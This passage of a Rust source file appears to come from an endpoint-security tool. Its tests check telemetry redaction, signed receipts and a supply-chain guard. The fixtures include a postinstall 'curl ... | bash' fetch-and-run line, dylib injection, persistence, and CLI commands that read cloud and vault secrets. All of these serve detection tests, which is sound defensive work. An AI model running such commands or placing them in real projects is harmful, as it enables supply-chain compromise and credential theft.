    stable_id("telemetry_privacy_report", evidence_hashes)
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct ResponseExecutionEffectBindingEntry {
    key: String,
    value_hash: String,
}

fn response_execution_id_from_effects(
    response_action_id: &str,
    evidence_bundle_id: &str,
    effects: &[EndpointResponseExecutionEffect],
) -> Result<String> {
    let effect_binding_digest = response_execution_effect_binding_digest_from_effects(effects)?
        .ok_or_else(|| anyhow!("response execution effect binding requires at least one effect"))?;
    Ok(response_execution_id_from_effect_digest(
        response_action_id,
        evidence_bundle_id,
        effect_binding_digest.as_str(),
    ))
}

fn response_execution_id_from_effect_digest(
    response_action_id: &str,
    evidence_bundle_id: &str,
    effect_binding_digest: &str,
) -> String {
    stable_id(
        "response_execution",
        [
            response_action_id,
            evidence_bundle_id,
            effect_binding_digest,
        ],
    )
}

fn response_execution_transition_id_from_reason_hash(
    prefix: &str,
    response_action_id: &str,
    evidence_bundle_id: &str,
    rollback_ref: &str,
    reason_hash: &str,
) -> String {
    stable_id(
        prefix,
        [
            response_action_id,
            evidence_bundle_id,
            rollback_ref,
            reason_hash,
        ],
    )
}

fn reconstruct_path(from: &str, to: &str, previous: &BTreeMap<String, String>) -> Vec<String> {
    let mut path = vec![to.to_string()];
    let mut cursor = to;
    while let Some(prev) = previous.get(cursor) {
        path.push(prev.clone());
        if prev == from {
            break;
        }
        cursor = prev;
    }
    path.reverse();
    path
}

#[cfg(test)]
mod tests {
    #![allow(clippy::expect_used, clippy::unwrap_used)]

    use std::sync::atomic::{AtomicU64, Ordering};
    use std::time::{SystemTime, UNIX_EPOCH};

    use super::*;

    static TEMP_ROOT_COUNTER: AtomicU64 = AtomicU64::new(0);

    fn observation(event: EndpointEvent) -> EndpointObservation {
        EndpointObservation {
            observation_id: stable_id("test", ["obs", event_name(&event)]),
            timestamp: Utc::now(),
            host_id: Some("host-1".to_string()),
            user_id: Some("alice".to_string()),
            session_id: Some("session-1".to_string()),
            process: EndpointProcess {
                pid: Some(42),
                process_guid: Some("proc-42".to_string()),
                image: Some("/usr/bin/npm".to_string()),
                command_line: Some("npm install".to_string()),
                signing: CodeSignatureStatus {
                    trust: SignatureTrust::Notarized,
                    notarized: Some(true),
                    ..CodeSignatureStatus::default()
                },
                ..EndpointProcess::default()
            },
            event,
            metadata: BTreeMap::new(),
        }
    }

    fn event_name(event: &EndpointEvent) -> &'static str {
        match event {
            EndpointEvent::PackageScript { .. } => "script",
            EndpointEvent::ProcessExec { .. } => "exec",
            EndpointEvent::FileAccess { .. } => "file",
            EndpointEvent::NetworkFlow { .. } => "network",
            EndpointEvent::DnsLookup { .. } => "dns",
            EndpointEvent::CredentialAccess { .. } => "credential",
            _ => "other",
        }
    }

    fn assert_unknown_field_rejected<T>(mut value: serde_json::Value, field: &str)
    where
        T: serde::de::DeserializeOwned,
    {
        value[field] = serde_json::Value::String("must not be ignored".to_string());
        let Err(err) = serde_json::from_value::<T>(value) else {
            panic!("expected unknown field {field} to be rejected");
        };
        let err = err.to_string();
        assert!(
            err.contains("unknown field") && err.contains(field),
            "expected unknown field {field} to be rejected, got {err}"
        );
    }

    fn write_jsonl_value(path: &Path, value: &serde_json::Value) {
        let mut bytes = serde_json::to_vec(value).unwrap();
        bytes.push(b'\n');
        fs::write(path, bytes).unwrap();
    }

    fn assert_anyhow_error_mentions_unknown_field(err: anyhow::Error, field: &str) {
        let chain = err
            .chain()
            .map(std::string::ToString::to_string)
            .collect::<Vec<_>>()
            .join("\n");
        assert!(
            chain.contains("unknown field") && chain.contains(field),
            "expected unknown field {field} to be rejected, got {chain}"
        );
    }

    #[test]
    fn endpoint_runtime_identity_deserialization_rejects_unknown_fields() {
        let signing = CodeSignatureStatus {
            trust: SignatureTrust::Signed,
            team_id: Some("TEAMID1234".to_string()),
            signing_id: Some("com.example.tool".to_string()),
            cdhash: Some("actual-cdhash".to_string()),
            expected_cdhash: Some("expected-cdhash".to_string()),
            notarized: Some(true),
        };

        assert_unknown_field_rejected::<CodeSignatureStatus>(
            serde_json::to_value(&signing).unwrap(),
            "shadowCdhash",
        );

        let process = EndpointProcess {
            pid: Some(42),
            ppid: Some(7),
            process_guid: Some("proc-guid-42".to_string()),
            parent_process_guid: Some("proc-guid-7".to_string()),
            image: Some("/usr/local/bin/developer-tool".to_string()),
            command_line: Some("developer-tool build".to_string()),
            cwd: Some("/repo".to_string()),
            signing,
        };

        assert_unknown_field_rejected::<EndpointProcess>(
            serde_json::to_value(&process).unwrap(),
            "shadowProcessGuid",
        );

        let mut process_with_unknown_signing = serde_json::to_value(&process).unwrap();
        process_with_unknown_signing["signing"]["shadowCdhash"] =
            serde_json::Value::String("must not be ignored".to_string());
        let err = serde_json::from_value::<EndpointProcess>(process_with_unknown_signing)
            .unwrap_err()
            .to_string();
        assert!(
            err.contains("unknown field") && err.contains("shadowCdhash"),
            "expected unknown nested signing field to be rejected, got {err}"
        );
    }

    #[test]
    fn endpoint_observation_and_causal_graph_deserialization_reject_unknown_fields() {
        let observation = observation(EndpointEvent::NetworkFlow {
            host: "egress.example.invalid".to_string(),
            port: 443,
            protocol: Some("tcp".to_string()),
            url: Some("https://egress.example.invalid/upload".to_string()),
        });

        assert_unknown_field_rejected::<EndpointObservation>(
            serde_json::to_value(&observation).unwrap(),
            "shadowObservationId",
        );

        let mut recorder = CausalGraphRecorder::new();
        recorder.record_observation(&observation);
        let graph = recorder.into_graph();

        assert_unknown_field_rejected::<CausalGraph>(
            serde_json::to_value(&graph).unwrap(),
            "shadowNodeCount",
        );
        let node = graph
            .nodes
            .values()
            .next()
            .unwrap_or_else(|| panic!("expected graph node for strict serde regression"));
        assert_unknown_field_rejected::<CausalNode>(
            serde_json::to_value(node).unwrap(),
            "shadowLabel",
        );
        let edge = graph
            .edges
            .first()
            .unwrap_or_else(|| panic!("expected graph edge for strict serde regression"));
        assert_unknown_field_rejected::<CausalEdge>(
            serde_json::to_value(edge).unwrap(),
            "shadowObservationId",
        );
    }

    #[test]
    fn endpoint_receipt_evidence_deserialization_requires_redaction_class() {
        let missing_redaction_class = serde_json::json!({
            "key": "policyHash",
            "valueHash": sha256(b"policy@1").to_hex_prefixed()
        });
        let err = serde_json::from_value::<EndpointReceiptEvidence>(missing_redaction_class)
            .unwrap_err()
            .to_string();
        assert!(
            err.contains("redactionClass"),
            "expected missing redactionClass to be rejected, got {err}"
        );

        let explicit_redaction_class = serde_json::json!({
            "key": "policyHash",
            "valueHash": sha256(b"policy@1").to_hex_prefixed(),
            "redactionClass": "hash_only"
        });
        let evidence = serde_json::from_value::<EndpointReceiptEvidence>(explicit_redaction_class)
            .unwrap_or_else(|err| panic!("explicit redaction class should deserialize: {err}"));
        assert_eq!(
            evidence.redaction_class,
            EndpointEvidenceRedactionClass::HashOnly
        );
        assert!(evidence.raw_value.is_none());

        let unknown_evidence_field = serde_json::json!({
            "key": "policyHash",
            "valueHash": sha256(b"policy@1").to_hex_prefixed(),
            "redactionClass": "hash_only",
            "rawSecret": "must not be ignored"
        });
        let err = serde_json::from_value::<EndpointReceiptEvidence>(unknown_evidence_field)
            .unwrap_err()
            .to_string();
        assert!(
            err.contains("unknown field") && err.contains("rawSecret"),
            "expected unknown evidence field to be rejected, got {err}"
        );
    }

    #[test]
    fn telemetry_privacy_report_hashes_features_and_suppresses_raw_artifacts_by_default() {
        let event = observation(EndpointEvent::FileAccess {
            operation: FileOperation::Read,
            path: "/Users/alice/Work/customer-secret.txt".to_string(),
            source_url: Some("https://intranet.example/download?token=secret".to_string()),
            content_preview: Some("raw customer token material".to_string()),
        });

        let report = EndpointTelemetryPrivacyReport::from_observations(
            &[event],
            EndpointTelemetryPrivacyMode::HashesFeatures,
        );

        assert_eq!(report.observation_count, 1);
        assert!(!report.raw_artifact_upload_permitted);
        assert!(report.hash_only_count > 0);
        assert!(report.raw_suppressed_count > 0);
        assert!(report.observations[0].projections.iter().any(|projection| {
            projection.field_path == "event.fileAccess.path"
                && projection.redaction_class == EndpointEvidenceRedactionClass::HashOnly
                && projection.raw_value.is_none()
                && projection
                    .value_hash
                    .as_deref()
                    .is_some_and(|hash| hash.starts_with("0x"))
        }));
        assert!(report.observations[0].projections.iter().any(|projection| {
            projection.field_path == "event.fileAccess.contentPreview"
                && projection.redaction_class == EndpointEvidenceRedactionClass::LocalOnly
                && projection.raw_value.is_none()
        }));
    }

    #[test]
    fn telemetry_privacy_report_deserialization_rejects_unknown_fields() {
        let event = observation(EndpointEvent::FileAccess {
            operation: FileOperation::Read,
            path: "/Users/alice/Work/customer-secret.txt".to_string(),
            source_url: Some("https://intranet.example/download?token=secret".to_string()),
            content_preview: Some("raw customer token material".to_string()),
        });
        let report = EndpointTelemetryPrivacyReport::from_observations(
            &[event],
            EndpointTelemetryPrivacyMode::HashesFeatures,
        );

        assert_unknown_field_rejected::<EndpointTelemetryPrivacyReport>(
            serde_json::to_value(&report).unwrap(),
            "shadowRawArtifact",
        );
        assert_unknown_field_rejected::<EndpointTelemetryObservationProjection>(
            serde_json::to_value(&report.observations[0]).unwrap(),
            "shadowRawObservation",
        );
        assert_unknown_field_rejected::<EndpointTelemetryFieldProjection>(
            serde_json::to_value(&report.observations[0].projections[0]).unwrap(),
            "shadowRawValue",
        );
    }

    #[test]
    fn telemetry_privacy_report_hashes_dns_names_and_resolvers() {
        let event = observation(EndpointEvent::DnsLookup {
            query: "api.internal.example".to_string(),
            record_type: Some("A".to_string()),
            answers: vec!["10.1.2.3".to_string()],
            resolver: Some("10.0.0.53".to_string()),
            status: Some("noerror".to_string()),
        });

        let report = EndpointTelemetryPrivacyReport::from_observations(
            &[event],
            EndpointTelemetryPrivacyMode::HashesFeatures,
        );

        let projections = &report.observations[0].projections;
        assert!(projections.iter().any(|projection| {
            projection.field_path == "event.dnsLookup.query"
                && projection.redaction_class == EndpointEvidenceRedactionClass::HashOnly
                && projection.raw_value.is_none()
        }));
        assert!(projections.iter().any(|projection| {
            projection.field_path == "event.dnsLookup.recordType"
                && projection.redaction_class == EndpointEvidenceRedactionClass::MetadataOnly
                && projection.feature_value.as_deref() == Some("A")
        }));
        assert!(projections.iter().any(|projection| {
            projection.field_path == "event.dnsLookup.resolver"
                && projection.redaction_class == EndpointEvidenceRedactionClass::HashOnly
                && projection.raw_value.is_none()
        }));
    }

    #[test]
    fn telemetry_privacy_report_allows_raw_artifacts_only_in_explicit_mode() {
        let event = observation(EndpointEvent::ToolCall {
            tool_name: "browser.open".to_string(),
            parameters: serde_json::json!({
                "prompt": "copy the customer secret into the form"
            }),
        });

        let default_report = EndpointTelemetryPrivacyReport::from_observations(
            std::slice::from_ref(&event),
            EndpointTelemetryPrivacyMode::HashesFeatures,
        );
        let raw_report = EndpointTelemetryPrivacyReport::from_observations(
            &[event],
            EndpointTelemetryPrivacyMode::RawArtifactPermitted,
        );

        assert!(!default_report.raw_artifact_upload_permitted);
        assert!(!default_report.observations[0]
            .projections
            .iter()
            .any(|projection| projection.raw_value.is_some()));
        assert!(raw_report.raw_artifact_upload_permitted);
        assert!(raw_report.observations[0]
            .projections
            .iter()
            .any(|projection| {
                projection.field_path == "event.toolCall.parameters"
                    && projection.redaction_class
                        == EndpointEvidenceRedactionClass::RawArtifactPermitted
                    && projection
                        .raw_value
                        .as_deref()
                        .is_some_and(|value| value.contains("customer secret"))
            }));
    }

    #[test]
    fn endpoint_telemetry_privacy_receipt_binds_mode_and_counts() {
        let event = observation(EndpointEvent::ToolCall {
            tool_name: "browser.open".to_string(),
            parameters: serde_json::json!({
                "prompt": "copy the customer secret into the form"
            }),
        });
        let report = EndpointTelemetryPrivacyReport::from_observations(
            &[event],
            EndpointTelemetryPrivacyMode::HashesFeatures,
        );
        let keypair = hush_core::Keypair::from_seed(&[41u8; 32]);
        let mut receipt =
            EndpointDecisionReceipt::for_telemetry_privacy(EndpointTelemetryPrivacyReceiptInput {
                local_sequence: 41,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                report: &report,
            });
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.receipt_family,
            EndpointDecisionReceiptFamily::PrivacyReport
        );
        assert_eq!(
            receipt.decision.finding_id.as_deref(),
            Some(report.report_id.as_str())
        );
        assert_eq!(
            receipt.decision.rule_id.as_deref(),
            Some("endpoint.telemetry_privacy")
        );
        assert_eq!(receipt.decision.action, EndpointDecisionAction::Observe);
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "privacyMode"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "rawSuppressedCount"));
        assert!(receipt.evidence.iter().all(|item| item.raw_value.is_none()));

        let mut leaked_hash_only_receipt = receipt.clone();
        leaked_hash_only_receipt.evidence[0].raw_value =
            Some("raw customer secret material".to_string());
        assert!(leaked_hash_only_receipt
            .validate()
            .unwrap_err()
            .to_string()
            .contains("raw evidence"));

        let mut mismatched_report_id = receipt.clone();
        if let Some(report_id_evidence) = mismatched_report_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "privacyReportId")
        {
            *report_id_evidence = EndpointReceiptEvidence::hashed(
                "privacyReportId",
                "telemetry_privacy_report:other",
            );
        }
        assert!(mismatched_report_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("privacy report id evidence hash"));

        let mut relabeled_report_id = receipt.clone();
        relabeled_report_id.decision.finding_id =
            Some("telemetry_privacy_report:other".to_string());
        if let Some(report_id_evidence) = relabeled_report_id
            .evidence
            .iter_mut()
            .find(|item| item.key == "privacyReportId")
        {
            *report_id_evidence = EndpointReceiptEvidence::hashed(
                "privacyReportId",
                "telemetry_privacy_report:other",
            );
        }
        assert!(relabeled_report_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("privacy report id"));

        let mut missing_raw_suppressed_count = receipt.clone();
        missing_raw_suppressed_count
            .evidence
            .retain(|item| item.key != "rawSuppressedCount");
        assert!(missing_raw_suppressed_count
            .validate()
            .unwrap_err()
            .to_string()
            .contains("privacy report raw suppressed count evidence"));

        let mut mismatched_raw_receipt = receipt;
        mismatched_raw_receipt.evidence[0].redaction_class =
            EndpointEvidenceRedactionClass::RawArtifactPermitted;
        mismatched_raw_receipt.evidence[0].raw_value =
            Some("different raw customer secret material".to_string());
        assert!(mismatched_raw_receipt
            .validate()
            .unwrap_err()
            .to_string()
            .contains("raw evidence hash"));
    }

    #[test]
    fn endpoint_telemetry_privacy_receipt_binds_raw_artifact_approval() {
        let event = observation(EndpointEvent::ToolCall {
            tool_name: "browser.open".to_string(),
            parameters: serde_json::json!({
                "prompt": "copy the customer secret into the form"
            }),
        });
        let reason_hash = sha256(b"incident ir-41 live collection approved").to_hex_prefixed();
        let report = EndpointTelemetryPrivacyReport::from_observations_with_raw_artifact_approval(
            &[event],
            EndpointTelemetryPrivacyMode::RawArtifactPermitted,
            Some("approval-ir-41"),
            Some(reason_hash.as_str()),
        );
        let receipt =
            EndpointDecisionReceipt::for_telemetry_privacy(EndpointTelemetryPrivacyReceiptInput {
                local_sequence: 42,
                endpoint_id: "endpoint-1",
                signer_identity: "local-edr:endpoint-1",
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                report: &report,
            });

        receipt
            .validate()
            .expect("raw privacy receipt should validate");
        assert_eq!(
            report.raw_artifact_approval_id.as_deref(),
            Some("approval-ir-41")
        );
        assert_eq!(
            report.raw_artifact_approval_reason_hash.as_deref(),
            Some(reason_hash.as_str())
        );
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "rawArtifactApprovalId"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "rawArtifactApprovalReasonHash"));

        let mut missing_approval = receipt.clone();
        missing_approval
            .evidence
            .retain(|item| item.key != "rawArtifactApprovalId");
        assert!(missing_approval
            .validate()
            .unwrap_err()
            .to_string()
            .contains("privacy report raw artifact approval id evidence"));

        let mut mismatched_approval = receipt;
        if let Some(approval) = mismatched_approval
            .evidence
            .iter_mut()
            .find(|item| item.key == "rawArtifactApprovalId")
        {
            *approval = EndpointReceiptEvidence::hashed("rawArtifactApprovalId", "approval-other");
        }
        assert!(mismatched_approval
            .validate()
            .unwrap_err()
            .to_string()
            .contains("privacy report id"));
    }

    #[test]
    fn supply_chain_guard_flags_risky_npm_postinstall_script() {
        let guard = SupplyChainRuntimeGuard::new();
        let event = observation(EndpointEvent::PackageScript {
            manager: PackageManager::Npm,
            package: Some("leftpad-plus".to_string()),
            phase: "postinstall".to_string(),
            script: "curl https://example.invalid/payload.sh | bash -c".to_string(),
            working_directory: Some("/tmp/pkg".to_string()),
        });

        let findings = guard.evaluate(&event);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "supply_chain.install_script.risky");
        assert_eq!(findings[0].severity, DetectionSeverity::High);
        assert!(findings[0].mitre_attack.contains(&"T1195.002".to_string()));
    }

    #[test]
    fn supply_chain_guard_flags_unsigned_downloaded_binary() {
        let guard = SupplyChainRuntimeGuard::new();
        let mut event = observation(EndpointEvent::ProcessExec {
            image: "/Users/alice/Downloads/build-helper".to_string(),
            args: vec!["--postinstall".to_string()],
            env: BTreeMap::new(),
        });
        event.process.signing = CodeSignatureStatus {
            trust: SignatureTrust::Unsigned,
            notarized: Some(false),
            ..CodeSignatureStatus::default()
        };

        let findings = guard.evaluate(&event);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "supply_chain.unsigned_binary.dev_path");
    }

    #[test]
    fn supply_chain_guard_flags_signature_drift_and_injection() {
        let guard = SupplyChainRuntimeGuard::new();
        let mut drift_event = observation(EndpointEvent::ProcessExec {
            image: "/usr/local/bin/developer-tool".to_string(),
            args: vec!["build".to_string()],
            env: BTreeMap::new(),
        });
        drift_event.process.signing = CodeSignatureStatus {
            trust: SignatureTrust::Signed,
            cdhash: Some("actual-cdhash".to_string()),
            expected_cdhash: Some("expected-cdhash".to_string()),
            notarized: Some(true),
            ..CodeSignatureStatus::default()
        };
        let mut injection_env = BTreeMap::new();
        injection_env.insert(
            "DYLD_INSERT_LIBRARIES".to_string(),
            "/tmp/libshim.dylib".to_string(),
        );
        let package_manager_injection = observation(EndpointEvent::ProcessExec {
            image: "/usr/local/bin/npm".to_string(),
            args: vec!["install".to_string()],
            env: injection_env,
        });
        let dylib_event = observation(EndpointEvent::DylibLoad {
            path: "/Users/alice/Library/Caches/libspy.dylib".to_string(),
            target_image: Some("/usr/local/bin/node".to_string()),
            mechanism: Some("DYLD_INSERT_LIBRARIES".to_string()),
        });

        let drift_findings = guard.evaluate(&drift_event);
        let package_manager_findings = guard.evaluate(&package_manager_injection);
        let dylib_findings = guard.evaluate(&dylib_event);

        assert!(drift_findings
            .iter()
            .any(|finding| finding.rule_id == "supply_chain.signature_drift"));
        assert!(package_manager_findings
            .iter()
            .any(|finding| finding.rule_id == "supply_chain.package_manager_dylib_injection"));
        assert!(dylib_findings
            .iter()
            .any(|finding| finding.rule_id == "supply_chain.dylib_injection"));
    }

    #[test]
    fn supply_chain_guard_flags_persistence_and_unmanaged_browser_extensions() {
        let guard = SupplyChainRuntimeGuard::new();
        let launch_event = observation(EndpointEvent::LaunchPersistence {
            path: "/Users/alice/Library/LaunchAgents/com.example.updater.plist".to_string(),
            label: Some("com.example.updater".to_string()),
            operation: FileOperation::Create,
        });
        let extension_event = observation(EndpointEvent::BrowserExtensionInstall {
            browser: "chrome".to_string(),
            extension_id: Some("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".to_string()),
            path: "/Users/alice/Library/Application Support/Google/Chrome/Default/Extensions/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".to_string(),
            source: Some("developer_mode".to_string()),
        });

        let launch_findings = guard.evaluate(&launch_event);
        let extension_findings = guard.evaluate(&extension_event);

        assert!(launch_findings
            .iter()
            .any(|finding| finding.rule_id == "supply_chain.launch_persistence"));
        assert!(extension_findings
            .iter()
            .any(|finding| finding.rule_id == "supply_chain.unmanaged_browser_extension"));
    }

    #[test]
    fn supply_chain_guard_flags_sensitive_cloud_cli_operations() {
        let guard = SupplyChainRuntimeGuard::new();
        let mut aws_env = BTreeMap::new();
        aws_env.insert("AWS_ACCESS_KEY_ID".to_string(), "AKIAEXAMPLE".to_string());
        aws_env.insert("AWS_SECRET_ACCESS_KEY".to_string(), "secret".to_string());
        let aws_event = observation(EndpointEvent::ProcessExec {
            image: "/opt/homebrew/bin/aws".to_string(),
            args: vec![
                "secretsmanager".to_string(),
                "get-secret-value".to_string(),
                "--secret-id".to_string(),
                "prod/db".to_string(),
            ],
            env: aws_env,
        });
        let gcloud_event = observation(EndpointEvent::ProcessExec {
            image: "/usr/local/bin/gcloud".to_string(),
            args: vec![
                "auth".to_string(),
                "print-access-token".to_string(),
                "--impersonate-service-account".to_string(),
                "deploy@example.iam.gserviceaccount.com".to_string(),
            ],
            env: BTreeMap::new(),
        });
        let github_event = observation(EndpointEvent::ProcessExec {
            image: "/opt/homebrew/bin/gh".to_string(),
            args: vec![
                "secret".to_string(),
                "set".to_string(),
                "PROD_DB_URL".to_string(),
                "--body".to_string(),
                "redacted".to_string(),
                "--repo".to_string(),
                "acme/service".to_string(),
            ],
            env: BTreeMap::new(),
        });
        let vercel_event = observation(EndpointEvent::ProcessExec {
            image: "/opt/homebrew/bin/vercel".to_string(),
            args: vec![
                "env".to_string(),
                "pull".to_string(),
                ".env.local".to_string(),
                "--environment".to_string(),
                "production".to_string(),
            ],
            env: BTreeMap::new(),
        });
        let netlify_event = observation(EndpointEvent::ProcessExec {
            image: "/opt/homebrew/bin/netlify".to_string(),
            args: vec![
                "env:get".to_string(),
                "API_KEY".to_string(),
                "--context".to_string(),
                "production".to_string(),
            ],
            env: BTreeMap::new(),
        });
        let mut wrangler_env = BTreeMap::new();
        wrangler_env.insert(
            "CLOUDFLARE_API_TOKEN".to_string(),
            "redacted-token".to_string(),
        );
        let wrangler_event = observation(EndpointEvent::ProcessExec {
            image: "/opt/homebrew/bin/wrangler".to_string(),
            args: vec![
                "secret".to_string(),
                "put".to_string(),
                "API_TOKEN".to_string(),
                "--env".to_string(),
                "production".to_string(),
            ],
            env: wrangler_env,
        });
        let mut doctl_env = BTreeMap::new();
        doctl_env.insert(
            "DIGITALOCEAN_ACCESS_TOKEN".to_string(),
            "redacted-token".to_string(),
        );
        let doctl_event = observation(EndpointEvent::ProcessExec {
            image: "/opt/homebrew/bin/doctl".to_string(),
            args: vec![
                "registry".to_string(),
                "docker-config".to_string(),
                "example-registry".to_string(),
                "--read-write".to_string(),
            ],
            env: doctl_env,
        });
        let mut fly_env = BTreeMap::new();
        fly_env.insert("FLY_API_TOKEN".to_string(), "redacted-token".to_string());
        let fly_event = observation(EndpointEvent::ProcessExec {
            image: "/opt/homebrew/bin/fly".to_string(),
            args: vec![
                "secrets".to_string(),
                "set".to_string(),
                "DATABASE_URL=postgres://example".to_string(),
                "--app".to_string(),
                "api".to_string(),
            ],
            env: fly_env,
        });

        let aws_findings = guard.evaluate(&aws_event);
        let gcloud_findings = guard.evaluate(&gcloud_event);
        let github_findings = guard.evaluate(&github_event);
        let vercel_findings = guard.evaluate(&vercel_event);
        let netlify_findings = guard.evaluate(&netlify_event);
        let wrangler_findings = guard.evaluate(&wrangler_event);
        let doctl_findings = guard.evaluate(&doctl_event);
        let fly_findings = guard.evaluate(&fly_event);

        let aws_finding = aws_findings
            .iter()
            .find(|finding| finding.rule_id == "supply_chain.cloud_cli_sensitive_operation")
            .unwrap_or_else(|| panic!("missing AWS cloud CLI sensitive operation finding"));
        assert!(aws_finding
            .evidence
            .iter()
            .any(|item| item.key == "cloudCli" && item.value == "aws"));
        assert!(aws_finding.evidence.iter().any(
            |item| item.key == "credentialEnvKeys" && item.value.contains("AWS_ACCESS_KEY_ID")
        ));
        assert!(gcloud_findings
            .iter()
            .any(|finding| finding.rule_id == "supply_chain.cloud_cli_sensitive_operation"));
        let github_finding = github_findings
            .iter()
            .find(|finding| finding.rule_id == "supply_chain.cloud_cli_sensitive_operation")
            .unwrap_or_else(|| panic!("missing GitHub CLI sensitive operation finding"));
        assert!(github_finding
            .evidence
            .iter()
            .any(|item| item.key == "cloudCli" && item.value == "gh"));
        let vercel_finding = vercel_findings
            .iter()
            .find(|finding| finding.rule_id == "supply_chain.cloud_cli_sensitive_operation")
            .unwrap_or_else(|| panic!("missing Vercel CLI sensitive operation finding"));
        assert!(vercel_finding
            .evidence
            .iter()
            .any(|item| item.key == "cloudCli" && item.value == "vercel"));
        let netlify_finding = netlify_findings
            .iter()
            .find(|finding| finding.rule_id == "supply_chain.cloud_cli_sensitive_operation")
            .unwrap_or_else(|| panic!("missing Netlify CLI sensitive operation finding"));
        assert!(netlify_finding
            .evidence
            .iter()
            .any(|item| item.key == "cloudCli" && item.value == "netlify"));
        let wrangler_finding = wrangler_findings
            .iter()
            .find(|finding| finding.rule_id == "supply_chain.cloud_cli_sensitive_operation")
            .unwrap_or_else(|| panic!("missing Wrangler CLI sensitive operation finding"));
        assert!(wrangler_finding
            .evidence
            .iter()
            .any(|item| item.key == "cloudCli" && item.value == "wrangler"));
        assert!(wrangler_finding
            .evidence
            .iter()
            .any(|item| item.key == "credentialEnvKeys"
                && item.value.contains("CLOUDFLARE_API_TOKEN")));
        let doctl_finding = doctl_findings
            .iter()
            .find(|finding| finding.rule_id == "supply_chain.cloud_cli_sensitive_operation")
            .unwrap_or_else(|| panic!("missing doctl CLI sensitive operation finding"));
        assert!(doctl_finding
            .evidence
            .iter()
            .any(|item| item.key == "cloudCli" && item.value == "doctl"));
        assert!(doctl_finding
            .evidence
            .iter()
            .any(|item| item.key == "credentialEnvKeys"
                && item.value.contains("DIGITALOCEAN_ACCESS_TOKEN")));
        let fly_finding = fly_findings
            .iter()
            .find(|finding| finding.rule_id == "supply_chain.cloud_cli_sensitive_operation")
            .unwrap_or_else(|| panic!("missing Fly CLI sensitive operation finding"));
        assert!(fly_finding
            .evidence
            .iter()
            .any(|item| item.key == "cloudCli" && item.value == "fly"));
        assert!(fly_finding
            .evidence
            .iter()
            .any(|item| item.key == "credentialEnvKeys" && item.value.contains("FLY_API_TOKEN")));
    }

    #[test]
    fn supply_chain_guard_flags_secret_management_and_platform_cli_operations() {
        let guard = SupplyChainRuntimeGuard::new();
        let cases = [
            (
                "/opt/homebrew/bin/op",
                vec!["item", "get", "prod/api-token"],
                "OP_SERVICE_ACCOUNT_TOKEN",
                "op",
            ),
            (
                "/usr/local/bin/vault",
                vec!["kv", "get", "secret/prod/api"],
                "VAULT_TOKEN",
                "vault",
            ),
            (
                "/opt/homebrew/bin/doppler",
                vec!["secrets", "download", "--no-file"],
                "DOPPLER_TOKEN",
                "doppler",
            ),
            (
                "/opt/homebrew/bin/heroku",
                vec!["config:get", "DATABASE_URL", "--app", "prod-api"],
                "HEROKU_API_KEY",
                "heroku",
            ),
            (
                "/opt/homebrew/bin/supabase",
                vec!["secrets", "list", "--project-ref", "prodref"],
                "SUPABASE_ACCESS_TOKEN",
                "supabase",
            ),
            (
                "/opt/homebrew/bin/firebase",
                vec![
                    "functions:secrets:access",
                    "STRIPE_WEBHOOK_SECRET",
                    "--project",
                    "prod-api",
                ],
                "FIREBASE_TOKEN",
                "firebase",
            ),
            (
                "/opt/homebrew/bin/railway",
                vec!["variables", "--service", "api"],
                "RAILWAY_TOKEN",
                "railway",
            ),
            (
                "/opt/homebrew/bin/stripe",
                vec!["login", "--api-key", "sk_test_redacted"],
                "STRIPE_API_KEY",
                "stripe",
            ),
            (
                "/opt/homebrew/bin/stripe",
                vec![
                    "listen",
                    "--print-secret",
                    "--forward-to",
                    "localhost:4242/webhook",
                ],
                "STRIPE_WEBHOOK_SECRET",
                "stripe",
            ),
            (
                "/opt/homebrew/bin/sentry-cli",
                vec!["login", "--auth-token=sk-SENTRYTOKEN_1234567890abcdef"],
                "SENTRY_AUTH_TOKEN",
                "sentry",
            ),
            (
                "/opt/homebrew/bin/snyk",
                vec!["auth", "--auth-token=sk-SNYKTOKEN_1234567890abcdef"],
                "SNYK_TOKEN",
                "snyk",
            ),
            (
                "/opt/homebrew/bin/bw",
                vec!["get", "item", "prod/api-token"],
                "BW_SESSION",
                "bitwarden",
            ),
            (
                "/opt/homebrew/bin/kubectl",
                vec!["get", "secret", "prod-token", "-o", "yaml"],
                "KUBECONFIG",
                "kubectl",
            ),
            (
                "/opt/homebrew/bin/pulumi",
                vec!["config", "get", "dbPassword", "--show-secrets"],
                "PULUMI_ACCESS_TOKEN",
                "pulumi",
            ),
            (
                "/opt/homebrew/bin/circleci",
                vec![
                    "context",
                    "store-secret",
                    "github",
                    "acme",
                    "production",
                    "DATABASE_URL",
                ],
                "CIRCLECI_CLI_TOKEN",
                "circleci",
            ),
            (
                "/opt/homebrew/bin/glab",
                vec![
                    "variable",
                    "set",
                    "DATABASE_URL",
                    "postgres://redacted",
                    "--masked",
                ],
                "GITLAB_TOKEN",
                "glab",
            ),
            (
                "/usr/local/bin/buildkite-agent",
                vec!["secret", "get", "deploy_key"],
                "BUILDKITE_AGENT_ACCESS_TOKEN",
                "buildkite",
            ),
            (
                "/usr/local/bin/drone",
                vec!["secret", "get", "acme/service", "deploy_key"],
                "DRONE_TOKEN",
